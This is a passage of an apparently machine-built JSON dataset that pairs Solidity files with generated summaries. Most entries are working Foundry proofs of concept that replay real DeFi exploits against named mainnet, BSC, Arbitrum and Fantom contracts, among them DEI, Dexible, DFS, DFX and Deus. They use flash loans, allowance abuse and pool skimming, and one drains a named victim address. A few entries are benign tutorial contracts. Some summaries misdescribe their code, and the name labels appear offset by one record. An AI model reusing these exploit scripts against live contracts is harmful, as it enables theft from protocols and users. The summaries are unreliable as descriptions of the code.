USDC.balanceOf(address(this)),\n            6\n        );\n    }\n\n    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external{\n        LSW.flashLoan(address(this), address(USDC), flashLoanAmount, new bytes(1));\n        LSW.redeem(depositAmount, address(this), address(this));\n        USDC.transfer(address(Pair), (flashLoanAmount + flashLoanFee)* 1000 / 997 + 1000);\n    }\n\n    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns(bytes32){\n        USDC.approve(address(LSW), type(uint).max);\n        depositAmount = LSW.deposit(flashLoanAmount, address(this));\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n}",
        "summary": "This code defines a Solidity smart contract that interacts with several other smart contracts and tokens on the Ethereum blockchain. The contract imports an interface and a testing library. It defines a function that performs an exploit involving flash loans and swaps on a Uniswap liquidity pool, and another function that reacts to a flash loan. The specific tokens and contracts being used are identified through their addresses and interfaces. There is also a reference to a \"CheatCodes\" contract, which is not defined in this code and may be a proprietary library.",
        "id": "ef62f9f7-78c2-4624-a97b-b2127ecbc6d0",
        "api_seq": "DEI_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/eugenioclrc/status/1654576296507088906\n// @TX\n// https://arbiscan.io/tx/0xb1141785b7b94eb37c39c37f0272744c6e79ca1517529fec3f4af59d4c3c37ef\n\ninterface IStablePair{\n    function sync() external;\n    function skim() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\ninterface IDEI is IERC20{\n    function burnFrom(address account, uint256 amount) external;\n}\n\ncontract DEIPocTest is DSTest{\n    IStablePair pair = IStablePair(0x7DC406b9B904a52D10E19E848521BbA2dE74888b);\n    IDEI DEI = IDEI(0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0);\n    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"https://rpc.ankr.com/arbitrum\", 87626024);\n    }\n\n    function testExploit() public{\n        console.log(\"DEI balance: \", DEI.balanceOf(address(this)));\n\n        DEI.approve(address(pair), type(uint).max); \n        DEI.burnFrom(address(pair), 0);\n        DEI.transferFrom(address(pair), address(this), DEI.balanceOf(address(pair)) - 1);\n        console.log(\"DEI balance from attacker: \", DEI.balanceOf(address(this)));\n\n        pair.sync();\n\n        DEI.transfer(address(pair), DEI.balanceOf(address(this)));\n        pair.swap(0,5047470472572, address(this), \"\");\n        console.log(\"USDC balance after: \", USDC.balanceOf(address(this)));\n    }\n}",
        "summary": "This Solidity contract imports and utilizes other contracts/interfaces to interact with tokens and a pool on the Arbitrum network. It also imports a \"CheatCodes\" contract for testing purposes. Within the contract, the function `testExploit` performs a series of actions using the DEI token, the StablePair interface, and the USDC token. These actions involve approving an unlimited amount of DEI for the StablePair, burning DEI tokens from the pool, and transferring the remaining DEI tokens to the attacker's address. The StablePair's `sync` function is then called, followed by swapping a large amount of USDC tokens with the `swap` function. The purpose of this contract is not entirely clear, as it seems to be written specifically for testing purposes.",
        "id": "ec0b6a6b-20e3-4885-bf03-e04689e63001",
        "api_seq": "Delegatecall"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// delegatecall\u548ccall\u7c7b\u4f3c\uff0c\u90fd\u662f\u4f4e\u7ea7\u51fd\u6570\n// call: B call C, \u4e0a\u4e0b\u6587\u4e3a C (msg.sender = B, C\u4e2d\u7684\u72b6\u6001\u53d8\u91cf\u53d7\u5f71\u54cd)\n// delegatecall: B delegatecall C, \u4e0a\u4e0b\u6587\u4e3aB (msg.sender = A, B\u4e2d\u7684\u72b6\u6001\u53d8\u91cf\u53d7\u5f71\u54cd)\n// \u6ce8\u610fB\u548cC\u7684\u6570\u636e\u5b58\u50a8\u5e03\u5c40\u5fc5\u987b\u76f8\u540c\uff01\u53d8\u91cf\u7c7b\u578b\u3001\u58f0\u660e\u7684\u524d\u540e\u987a\u5e8f\u8981\u76f8\u540c\uff0c\u4e0d\u7136\u4f1a\u641e\u7838\u5408\u7ea6\u3002\n\n// \u88ab\u8c03\u7528\u7684\u5408\u7ea6C\ncontract C {\n    uint public num;\n    address public sender;\n\n    function setVars(uint _num) public payable {\n        num = _num;\n        sender = msg.sender;\n    }\n}\n\n// \u53d1\u8d77delegatecall\u7684\u5408\u7ea6B\ncontract B {\n    uint public num;\n    address public sender;\n\n    // \u901a\u8fc7call\u6765\u8c03\u7528C\u7684setVars()\u51fd\u6570\uff0c\u5c06\u6539\u53d8\u5408\u7ea6C\u91cc\u7684\u72b6\u6001\u53d8\u91cf\n    function callSetVars(address _addr, uint _num) external payable{\n        // call setVars()\n        (bool success, bytes memory data) = _addr.call(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n    }\n    // \u901a\u8fc7delegatecall\u6765\u8c03\u7528C\u7684setVars()\u51fd\u6570\uff0c\u5c06\u6539\u53d8\u5408\u7ea6B\u91cc\u7684\u72b6\u6001\u53d8\u91cf\n    function delegatecallSetVars(address _addr, uint _num) external payable{\n        // delegatecall setVars()\n        (bool success, bytes memory data) = _addr.delegatecall(\n            abi.encodeWithSignature(\"setVars(uint256)\", _num)\n        );\n    }\n}\n",
        "summary": "This code contains two Solidity contracts, `C` and `B`, which demonstrate the use of `call` and `delegatecall`. `C` has a public variable `num` and `sender` and a function `setVars` that sets the values of these variables. `B` has the same variables but also has two functions: `callSetVars` and `delegatecallSetVars`. \n\n`callSetVars` uses `call` to call `setVars` function of `C`, which changes the state variables of `C`. The context of the call is `C` and `msg.sender` is set to `B`. \n\n`delegatecallSetVars` uses `delegatecall` to call the `setVars` function of `C`. The context of the call is `B`, and `msg.sender` is set to the original caller of `B`. The `delegatecall` changes the state variables of `B`. \n\nThe code also includes comments explaining the difference between `call` and `delegatecall` and the importance of the data storage layout being the same between the two contracts.",
        "id": "20490cc9-436a-4dcc-8306-28f0cd1af872",
        "api_seq": "DeleteContract"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// selfdestruct: \u5220\u9664\u5408\u7ea6\uff0c\u5e76\u5f3a\u5236\u5c06\u5408\u7ea6\u5269\u4f59\u7684ETH\u8f6c\u5165\u6307\u5b9a\u8d26\u6237\n\ncontract DeleteContract {\n\n    uint public value = 10;\n\n    constructor() payable {}\n\n    receive() external payable {}\n\n    function deleteContract() external {\n        // \u8c03\u7528selfdestruct\u9500\u6bc1\u5408\u7ea6\uff0c\u5e76\u628a\u5269\u4f59\u7684ETH\u8f6c\u7ed9msg.sender\n        selfdestruct(payable(msg.sender));\n    }\n\n    function getBalance() external view returns(uint balance){\n        balance = address(this).balance;\n    }\n}\n",
        "summary": "This is a Solidity smart contract that allows for the deletion of the contract and transfer of any remaining Ether to a specified account. It includes a constructor and a receive function to accept Ether. The deleteContract function uses the selfdestruct function to destroy the contract and transfer any remaining Ether to the specified account. The getBalance function returns the contract's current balance.",
        "id": "d278d677-bb21-483d-a9f9-3d0fb5bbb8dd",
        "api_seq": "Denominations"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Denominations {\n    // WEI Denominations\n    uint constant WEI = 1 wei;\n    uint constant KWEI = 1000 wei;\n    uint constant MWEI = 1000000 wei;\n    uint constant GWEI = 1000000000 wei;\n\n    // Ether Denominations\n    uint constant MICROETHER = 1 szabo;\n    uint constant MILLIETHER = 1 finney;\n    uint constant ETHER = 1 ether;\n    uint constant KETHER = 1000 ether;\n    uint constant METHER = 1000000 ether;\n    uint constant GETHER = 1000000000 ether;\n    uint constant TETHER = 1000000000000 ether;\n}\n",
        "summary": "This Solidity code defines a contract called \"Denominations\" that sets constant values for various denominations of the Ethereum cryptocurrency. The values are provided in units of \"wei\", the smallest and indivisible unit of Ether. They include fractions of Ether and multipliers to convert between them. This code may be useful for developers who need to work with different denominations of Ethereum in their smart contracts.",
        "id": "43c93658-0656-4f5d-981c-e315c14dd0b5",
        "api_seq": "deus_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  IBaseV1Router01 router =\n    IBaseV1Router01(0xa38cd27185a464914D3046f0AB9d43356B34829D);\n\n  IDeiLenderSolidex DeiLenderSolidex =\n    IDeiLenderSolidex(0x8D643d954798392403eeA19dB8108f595bB8B730);\n\n  IUSDC usdc = IUSDC(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);\n\n  IERC20 dei = IERC20(0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3);\n\n  ISSPv4 sspv4 = ISSPv4(0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1);\n\n  IERC20 lpToken = IERC20(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0);\n\n  IERC20 DepositToken = IERC20(0xD82001B651F7fb67Db99C679133F384244e20E79);\n\n  address owner_of_usdc = 0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE;\n\n  ILpDepositor LpDepositor =\n    ILpDepositor(0x26E1A0d851CF28E697870e1b7F053B605C8b060F);\n\n  IOracle oracle = IOracle(0x8129026c585bCfA530445a6267f9389057761A00);\n\n  function setUp() public {\n    cheat.createSelectFork(\"fantom\", 37093708); // fork fantom at block 37093708\n  }\n\n  function testExample() public {\n    cheat.prank(owner_of_usdc);\n\n    usdc.Swapin(\n      0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98,\n      address(this),\n      150000000 * 10**6\n    );\n\n    uint256 balance_of_usdc = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"The USDC I have now\", balance_of_usdc);\n\n    usdc.approve(address(sspv4), type(uint256).max);\n\n    sspv4.buyDei(1000000 * 10**6);\n\n    uint256 balance_of_dei = dei.balanceOf(address(this));\n\n    emit log_named_uint(\"The DEI after buying DEI\", balance_of_dei);\n\n    balance_of_usdc = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"The USDC after buying DEI\", balance_of_usdc);\n\n    usdc.approve(address(router), type(uint256).max);\n\n    dei.approve(address(router), type(uint256).max);\n\n    router.addLiquidity(\n      address(dei),\n      address(usdc),\n      true,\n      894048109294000000000000,\n      965495000000,\n      876167147108120000000000,\n      946185100000,\n      address(this),\n      block.timestamp\n    );\n\n    uint256 balance_of_LpToken = lpToken.balanceOf(address(this));\n\n    emit log_named_uint(\n      \"The LPToken After adding Liquidity\",\n      balance_of_LpToken\n    );\n\n    lpToken.approve(address(LpDepositor), type(uint256).max);\n\n    LpDepositor.deposit(address(lpToken), balance_of_LpToken);\n\n    balance_of_LpToken = lpToken.balanceOf(address(this));\n\n    uint256 balance_of_DepositToken = DepositToken.balanceOf(address(this));\n\n    emit log_named_uint(\n      \"The DepositToken After depositting LPtoken\",\n      balance_of_DepositToken\n    );\n\n    DepositToken.approve(address(DeiLenderSolidex), type(uint256).max);\n\n    DeiLenderSolidex.addCollateral(address(this), balance_of_DepositToken);\n\n    balance_of_DepositToken = DepositToken.balanceOf(address(this));\n\n    emit log_named_uint(\n      \"The DepositToken After addCollateral\",\n      balance_of_DepositToken\n    );\n\n    balance_of_usdc = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"The USDC I have now\", balance_of_usdc);\n\n    usdc.approve(address(router), type(uint256).max);\n\n    router.swapExactTokensForTokensSimple(\n      143200000000000,\n      0,\n      address(usdc),\n      address(dei),\n      true,\n      address(this),\n      block.timestamp\n    );\n\n    balance_of_dei = dei.balanceOf(address(this));\n\n    emit log_named_uint(\"The DEI I have after swapping\", balance_of_dei);\n\n    SchnorrSign memory sig = SchnorrSign(\n      1835036472718200664753898924933875196349373787186253604571797551094739683650,\n      0xF096EC73cB49B024f1D93eFe893E38337E7a099a,\n      0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF\n    );\n\n    SchnorrSign[] memory sigs = new SchnorrSign[](1);\n\n    sigs[0] = sig;\n\n    bytes\n      memory repID = \"0x01701220183a8e97b39ebe3c38b6166cd7c9ddfe3c38fd76352e5652b9c25467aa47b040\";\n\n    uint256 price = oracle.getOnChainPrice();\n\n    emit log_named_uint(\"The price from Oracle\", price);\n\n    cheat.warp(1651113560);\n\n    emit log_named_uint(\"the time now\", block.timestamp);\n\n    DeiLenderSolidex.borrow(\n      address(this),\n      17246885701212305622476302,\n      20923953265992870251804289,\n      1651113560,\n      repID,\n      sigs\n    );\n\n    balance_of_dei = dei.balanceOf(address(this));\n\n    emit log_named_uint(\"The DEI after borrowing\", balance_of_dei);\n\n    router.swapExactTokensForTokensSimple(\n      12000000000000000000000000,\n      0,\n      address(dei),\n      address(usdc),\n      true,\n      address(this),\n      block.timestamp\n    );\n\n    usdc.transfer(owner_of_usdc, 150000000 * 10**6);\n\n    balance_of_dei = dei.balanceOf(address(this));\n\n    balance_of_usdc = usdc.balanceOf(address(this));\n\n    emit log_named_uint(\"The USDC after paying back\", balance_of_usdc);\n\n    emit log_named_uint(\"The DEI after paying back\", balance_of_dei);\n  }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of several different contracts and interfaces. The code imports various external contracts and interfaces and initializes them inside the `ContractTest` contract. The `setUp` function sets up a fork of the Fantom network at a particular block. The `testExample` function calls functions from the various imported interfaces to perform a series of actions, including swapping currency, adding liquidity, depositing tokens, borrowing tokens, and paying back borrowed tokens. The function emits logs to track the balance of tokens at various points throughout the process. At the end of the function, some tokens are transferred back to the contract owner.",
        "id": "ef76fdb1-597d-4f5d-999f-ab56c352727a",
        "api_seq": "Dexible_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1626493024879673344\n// @TX\n// https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6\n// https://twitter.com/MevRefund/status/1626450002254958592\n\nlibrary TokenTypes {\n    struct TokenAmount {\n        uint112 amount;\n        address token;\n    }\n}\n\nlibrary SwapTypes {\n    struct RouterRequest {\n        address router;\n        address spender;\n        TokenTypes.TokenAmount routeAmount;\n        bytes routerData;\n    }\n\n    struct SelfSwap {\n        address feeToken;\n        TokenTypes.TokenAmount tokenIn;\n        TokenTypes.TokenAmount tokenOut;\n        RouterRequest[] routes;\n    }\n}\n\ninterface IDexible {\n    function selfSwap(SwapTypes.SelfSwap calldata request) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 TRU = IERC20(0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784);\n    IDexible Dexible = IDexible(0xDE62E1b0edAa55aAc5ffBE21984D321706418024);\n    address victim = 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_646_022);\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(TRU), \"TRU\");\n        cheats.label(address(Dexible), \"Dexible\");\n    }\n\n    function testExploit() external {\n        deal(address(USDC), address(this), 15 * 1e6);\n        USDC.approve(address(Dexible), type(uint256).max);\n        uint256 transferAmount = TRU.balanceOf(victim);\n        if (TRU.allowance(victim, address(Dexible)) < transferAmount) {\n            transferAmount = TRU.allowance(victim, address(Dexible));\n        }\n        bytes memory callDatas =\n            abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victim, address(this), transferAmount);\n        TokenTypes.TokenAmount memory routeAmounts = TokenTypes.TokenAmount({amount: 0, token: address(TRU)});\n        TokenTypes.TokenAmount memory tokenIns = TokenTypes.TokenAmount({amount: 14_403_789, token: address(USDC)});\n        TokenTypes.TokenAmount memory tokenOuts = TokenTypes.TokenAmount({amount: 0, token: address(USDC)});\n        SwapTypes.RouterRequest[] memory route = new SwapTypes.RouterRequest[](1);\n        route[0] = SwapTypes.RouterRequest({\n            router: address(TRU),\n            spender: address(Dexible),\n            routeAmount: routeAmounts,\n            routerData: callDatas\n        });\n        SwapTypes.SelfSwap memory requests =\n            SwapTypes.SelfSwap({feeToken: address(USDC), tokenIn: tokenIns, tokenOut: tokenOuts, routes: route});\n        Dexible.selfSwap(requests);\n\n        emit log_named_decimal_uint(\"Attacker TRU balance after exploit\", TRU.balanceOf(address(this)), TRU.decimals());\n    }\n}\n",
        "summary": "This is a smart contract written in Solidity that contains a function called `testExploit`. This function executes a self-swapping attack by calling a function named `selfSwap` in another smart contract (with address `Dexible`), passing as argument a `SwapTypes.SelfSwap` struct representing multiple swapping requests. The purpose is to swap a large amount of USDC tokens while paying minimal swap fees in TRU tokens. The attack also involves transferring TRU tokens from a victim address to the contract's address before making the swaps.",
        "id": "7b4ec4c8-f7d2-4c8c-8c7e-947a3b73c4ee",
        "api_seq": "DFS_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~1,450 US$\n// Attacker : 0xb358BfD28b02c5e925b89aD8b0Eb35913D2d0805\n// Attack Contract : 0x87bfd80c2a05ee98cfe188fd2a0e4d70187db137\n// Vulnerable Contract : 0x2B806e6D78D8111dd09C58943B9855910baDe005\n// Attack Tx : https://bscscan.com/tx/0xcddcb447d64c2ce4b3ac5ebaa6d42e26d3ed0ff3831c08923c53ea998f598a7c\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/address/0x2B806e6D78D8111dd09C58943B9855910baDe005#code#830\n\n\n// @Analysis\n// CertiKAlert : https://twitter.com/CertiKAlert/status/1608788290785665024\n\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\nIPancakePair constant USDT_CCDS_LP = IPancakePair(0x2B948B5D3EBe9F463B29280FC03eBcB82db1072F);\nIPancakePair constant  DFS_USDT_LP = IPancakePair(0x4B02D85E086809eB7AF4E791103Bc4cde83480D1);\nIPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\naddress constant usdt = 0x55d398326f99059fF775485246999027B3197955;\naddress constant dfs = 0x2B806e6D78D8111dd09C58943B9855910baDe005;\naddress constant ccds = 0xBFd48CC239bC7e7cd5AD9F9630319F9b59e0B9e1;\n\n\ncontract Attacker is Test{\n    //  forge test --contracts ./src/test/DFS_exp.sol -vvvv\n    function setUp() public {\n        cheat.label(address(pancakeRouter), \"pancakeRouter\");\n        cheat.label(address(USDT_CCDS_LP), \"USDT_CCDS_LP\");\n        cheat.label(address(DFS_USDT_LP), \"DFS_USDT_LP\");\n        cheat.label(usdt, \"USDT\");\n        cheat.label(dfs, \"dfs\");\n        cheat.label(ccds, \"ccds\");\n        cheat.createSelectFork(\"bsc\", 24349821);\n    }\n      \n    function testExploit() public{\n        Exploit exploit = new Exploit();\n        emit log_named_decimal_uint(\"[start] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(exploit)), 18);        \n        exploit.harvest();\n        emit log_named_decimal_uint(\"[End] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(exploit)), 18);        \n    }\n}\n\n\ncontract Exploit is Test{ \n    uint borrowamount;  \n\n   function  harvest() public {\n        emit log_named_decimal_uint(\"[INFO]  usdt balance : DFS_USDT_LP\", IERC20(usdt).balanceOf(address(DFS_USDT_LP)), 18);\n        borrowamount= IERC20(usdt).balanceOf(address(DFS_USDT_LP));\n        USDT_CCDS_LP.swap(borrowamount, 0, address(this), \"0\");\n        emit log_named_decimal_uint(\"[INFO]  usdt balance : this\", IERC20(usdt).balanceOf(address(this)), 18);\n   }\n\n   function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n         if(keccak256(data) != keccak256(\"0\")) {return;  } \n        emit log(\"[INFO]  Flashloan received \");\n        emit log_named_decimal_uint(\"[INFO]  this balance (usdt token)\", IERC20(usdt).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[INFO]  this balance (dfs token)\", IERC20(dfs).balanceOf(address(this)), 18);\n        IERC20(usdt).transfer(address(DFS_USDT_LP), borrowamount );\n\n        (uint reserve0beforeswap, uint reserve1beforeswap, ) =  DFS_USDT_LP.getReserves();\n        uint256 swapamount = reserve0beforeswap * 499 /1000;   // swap 0.449 lp dfs \n        // DFS_USDT_LP.swap(reserve0beforeswap , 0,address(this), new bytes(1));\n        emit log_named_decimal_uint(\"[INFO]  swapamount \", swapamount, 18);\n        DFS_USDT_LP.swap(swapamount , 0,address(this), new bytes(1));\n        DFS_USDT_LP.sync();\n        \n        emit log_named_decimal_uint(\"[INFO]  dfs balance : address(this)\", IERC20(dfs).balanceOf(address(this)), 18);\n        uint dfstransferamount = IERC20(dfs).balanceOf(address(this));  \n        IERC20(dfs).transfer(address(DFS_USDT_LP),dfstransferamount *  98 /100 );  // transfer  98%  dfs balance\n        // loop 12 times skim() function\n        for(uint i = 0; i < 12; i++){\n            DFS_USDT_LP.skim(address(DFS_USDT_LP));\n        } \n        DFS_USDT_LP.skim(address(this)); \n        \n\n        uint txamount = IERC20(dfs).balanceOf(address(this)) ;\n        emit log_named_decimal_uint(\"[INFO]  dfs balance : address(this)\", txamount, 18);\n        IERC20(dfs).transfer(address(DFS_USDT_LP), txamount * 95 / 100);    //transfer  95%  dfs balance \n\n        emit log_named_decimal_uint(\"[INFO]  address(this) balance (dfs token)\", IERC20(dfs).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[INFO]  address(this) balance (usdt token)\", IERC20(usdt).balanceOf(address(this)), 18);\n        \n        //todo\n        uint  dfslpusdtamount =  IERC20(usdt).balanceOf(address(DFS_USDT_LP));\n        emit log_named_decimal_uint(\"[INFO]  address(DFS_USDT_LP) balance (usdt token)\", dfslpusdtamount, 18);\n        DFS_USDT_LP.swap(0,dfslpusdtamount * 999/ 1000,address(this),new bytes(1));   // swap 99.9 lp usdt\n        emit log_named_decimal_uint(\"[INFO] payback amount usdt \", IERC20(usdt).balanceOf(address(address(this))),18);\n        uint256 paybackfee = borrowamount *  1005 / 1000 ;    // 0.5% fee\n        bool suc = IERC20(usdt).transfer(address(USDT_CCDS_LP), paybackfee);\n        require(suc, \"[INFO]  Flashloan[1] payback failed \"); \n        emit log(\"[INFO]  Flashloan payback success \");\n    }\n \n\n\n}\n",
        "summary": "This code consists of two smart contracts: \"Attacker\" and \"Exploit\". The Attacker contract imports an interface and sets up a test. It then calls the exploit function from the Exploit contract, which swaps USDT for DFS tokens on a PancakeSwap liquidity pool, executes a flash loan using another liquidity pool, and transfers DFS tokens back to the original pool. The exploit is meant to drain a vulnerable smart contract of its funds.",
        "id": "3e4b51d4-4c43-4fd9-ae0e-3aab180c30d4",
        "api_seq": "DFX_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1590960299246780417\n// https://twitter.com/BeosinAlert/status/1591012525914861570\n// https://twitter.com/AnciliaInc/status/1590839104731684865\n// https://twitter.com/peckshield/status/1590831589004816384\n// TX\n// https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7\n\ninterface Curve{\n    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);\n    function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);\n    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    Curve dfx =Curve(0x46161158b1947D9149E066d6d31AF1283b2d377C);\n    uint256 receiption;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15941703);\n    }\n\n    function testExploit() public{\n        address(WETH).call{value: 2 ether}(\"\");\n        WETH.approve(address(Router), type(uint).max);\n        USDC.approve(address(Router), type(uint).max);\n        USDC.approve(address(dfx), type(uint).max);\n        XIDR.approve(address(Router), type(uint).max);\n        XIDR.approve(address(dfx), type(uint).max);\n\n        WETHToUSDC();\n\n        emit log_named_decimal_uint(\n            \"[Before] Attacker USDC balance before exploit\",\n            USDC.balanceOf(address(this)),\n            6\n        );\n\n        USDCToXIDR();\n        uint[] memory XIDR_USDC = new uint[](2);\n        XIDR_USDC[0] = 0;\n        XIDR_USDC[1] = 0;\n        ( , XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);\n        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee\n        dfx.withdraw(receiption, block.timestamp + 60);\n        XIDRToUSDC();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            USDC.balanceOf(address(this)),\n            6\n        );\n\n    }\n\n    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external{\n        (receiption, ) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);\n    }\n\n    function WETHToUSDC() internal{\n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(WETH),\n            tokenOut: address(USDC),\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: WETH.balanceOf(address(this)),\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        Router.exactInputSingle(_Params);\n    }\n\n    function USDCToXIDR() internal{\n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(USDC),\n            tokenOut: address(XIDR),\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: USDC.balanceOf(address(this)) / 2,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        Router.exactInputSingle(_Params);\n    }\n\n    function XIDRToUSDC() internal{\n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(XIDR),\n            tokenOut: address(USDC),\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: XIDR.balanceOf(address(this)) / 2,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        Router.exactInputSingle(_Params);\n    }\n\n}",
        "summary": "This is a Solidity smart contract used for testing an exploit of a vulnerability in the Curve.fi protocol. The contract imports an interface for the Curve.fi protocol and several other Solidity contracts and interfaces for interacting with other tokens. The `testExploit()` function is used to execute the exploit, which involves swapping tokens between different liquidity pools in Curve.fi to manipulate their exchange rates and create arbitrage opportunities. The tokens involved in the exploit are WETH, USDC, and XIDR. The contract also includes several utility functions for converting between different tokens and transferring funds.",
        "id": "2f99261b-2ccd-43bc-98ca-6e609163475a",
        "api_seq": "DiamondInheritance"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.13;\n\n/* \u7ee7\u627f\u6811\uff1a\n  God\n /  \\\nAdam Eve\n \\  /\npeople\n*/\n\ncontract God {\n    event Log(string message);\n\n    function foo() public virtual {\n        emit Log(\"God.foo called\");\n    }\n\n    function bar() public virtual {\n        emit Log(\"God.bar called\");\n    }\n}\n\ncontract Adam is God {\n    function foo() public virtual override {\n        emit Log(\"Adam.foo called\");\n    }\n\n    function bar() public virtual override {\n        emit Log(\"Adam.bar called\");\n        super.bar();\n    }\n}\n\ncontract Eve is God {\n    function foo() public virtual override {\n        emit Log(\"Eve.foo called\");\n    }\n\n    function bar() public virtual override {\n        emit Log(\"Eve.bar called\");\n        super.bar();\n    }\n}\n\ncontract people is Adam, Eve {\n    function foo() public override(Adam, Eve) {\n        super.foo();\n    }\n\n    function bar() public override(Adam, Eve) {\n        super.bar();\n    }\n}\n",
        "summary": "This code defines several Solidity contracts that inherit from each other in a hierarchical tree structure. The `God` contract defines two functions with virtual and public visibility, and emits an event when each one is called. The `Adam` and `Eve` contracts inherit from `God`, override the `foo` function, and call `super.bar()` in their own `bar` function. Finally, the `people` contract inherits from both `Adam` and `Eve`, and overrides `foo` and `bar` to call `super` and execute the corresponding `Adam` or `Eve` function.",
        "id": "9de6bc1a-7e70-4e2a-abd7-0fa88848a761",
        "api_seq": "DirectBurnBitSetterHelper"
    },
    {
